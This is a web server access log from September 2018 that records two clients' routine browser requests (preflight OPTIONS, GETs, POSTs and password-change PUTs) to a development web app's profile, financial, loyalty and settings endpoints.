ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /lists/get/all HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "GET /loyalty/confirm HTTP/1.1" 200 10705 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:10 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:10 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:10 +0000] "GET /financial/accounts HTTP/1.1" 200 25325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:11 +0000] "GET /surveys/total/points HTTP/1.1" 200 325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:11 +0000] "GET /signup/status HTTP/1.1" 200 774 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:11 +0000] "GET /lists/get/all HTTP/1.1" 200 6817 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:11 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:11 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "GET /property/property_linked HTTP/1.1" 200 1793 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:11 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:12 +0000] "OPTIONS /completion/value HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:13 +0000] "POST /completion/value HTTP/1.1" 200 298 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:13 +0000] "OPTIONS /completion/value HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:13 +0000] "OPTIONS /completion/value HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:13 +0000] "POST /completion/value HTTP/1.1" 200 298 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:13 +0000] "GET /completion/value HTTP/1.1" 200 376 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:13 +0000] "GET /completion/value HTTP/1.1" 200 377 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:28 +0000] "OPTIONS /signup/change_password HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:28 +0000] "PUT /signup/change_password HTTP/1.1" 401 309 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:42 +0000] "OPTIONS /signup/change_password HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:42 +0000] "PUT /signup/change_password HTTP/1.1" 201 297 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /loyalty/confirm HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /property/property_linked HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /surveys/total/points HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /signup/status HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /lists/get/all HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /property/property_linked HTTP/1.1" 200 419 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:57 +0000] "GET /loyalty/confirm HTTP/1.1" 200 10705 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:57 +0000] "GET /financial/accounts HTTP/1.1" 200 25325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:58 +0000] "OPTIONS /loyalty/confirm HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:58 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 433 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:58 +0000] "GET /surveys/total/points HTTP/1.1" 200 325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:58 +0000] "GET /user_details/user_details HTTP/1.1" 202 310 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:58 +0000] "GET /settings/profile HTTP/1.1" 200 2848 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:58 +0000] "GET /lists/get/all HTTP/1.1" 200 6817 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:58 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:58 +0000] "GET /signup/status HTTP/1.1" 200 774 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:57 +0000] "GET /property/property_linked HTTP/1.1" 200 1793 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:58 +0000] "GET /financial/accounts HTTP/1.1" 404 318 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:58 +0000] "GET /loyalty/confirm HTTP/1.1" 200 7849 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:58 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:58 +0000] "GET /property/property_linked HTTP/1.1" 200 728 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:58 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:00 +0000] "OPTIONS /completion/value HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:00 +0000] "POST /completion/value HTTP/1.1" 200 298 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:00 +0000] "OPTIONS /completion/value HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:00 +0000] "GET /completion/value HTTP/1.1" 200 377 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:00 +0000] "POST /completion/value HTTP/1.1" 200 298 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:01 +0000] "OPTIONS /completion/value HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:01 +0000] "GET /completion/value HTTP/1.1" 200 376 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:14 +0000] "OPTIONS /signup/change_password HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:14 +0000] "PUT /signup/change_password HTTP/1.1" 201 297 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /loyalty/confirm HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /property/property_linked HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /surveys/total/points HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /signup/status HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /loyalty/confirm HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 433 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /lists/get/all HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "GET /loyalty/confirm HTTP/1.1" 200 10705 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /property/property_linked HTTP/1.1" 200 419 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "GET /financial/accounts HTTP/1.1" 200 25325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "GET /financial/accounts HTTP/1.1" 404 318 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "GET /surveys/total/points HTTP/1.1" 200 325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "GET /lists/get/all HTTP/1.1" 200 6817 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:33 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "GET /signup/status HTTP/1.1" 200 774 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:34 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "GET /user_details/user_details HTTP/1.1" 202 310 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:26:34 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:26:33 +0000] "GET /property/property_linked HTTP/1.1" 200 1793 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
